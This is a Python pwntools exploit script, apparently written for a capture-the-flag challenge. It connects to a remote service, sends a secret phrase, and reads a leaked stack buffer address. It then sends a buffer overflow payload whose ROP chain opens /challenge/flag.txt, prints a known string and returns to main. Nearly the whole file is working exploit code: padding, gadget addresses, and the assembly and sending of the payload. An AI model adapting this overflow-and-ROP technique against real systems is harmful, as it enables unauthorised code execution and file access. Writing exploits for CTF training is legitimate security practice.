#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519

# Test: open + puts(known_str) + main
# If open works, we should see the known string printed, then banner
path = b'/challenge/flag.txt\x00'
pad = b'A' * 64 + b'B' * 8
rop = p64(pop_rdi)
rop += b'P' * 8
rop += p64(pop_rsi_r15)
rop += p64(0)
rop += p64(0)
rop += p64(0x4010e0)   # open@plt
rop += p64(pop_rdi)
rop += p64(0x402041)     # "Let's celebrate Spooktober!!!"
rop += p64(0x401040)     # puts@plt
rop += p64(0x401393)     # main

path_offset = len(pad) + len(rop)
path_addr = buf_leak + path_offset
rop = rop[:8] + p64(path_addr) + rop[16:]

payload = pad + rop + path
print(f'Payload: {len(payload)} bytes')
r.send(payload)

try:
    data = r.recv(timeout=5)
    print(f'Data: {data[:500]}')
    if b'Spooktober' in data:
        # Count occurrences
        count = data.count(b'Spooktober')
        print(f'Spooktober seen {count} times')
        if count >= 2:
            print('open + puts chain works!')
except Exception as e:
    print(f'Error: {e}')
r.close()
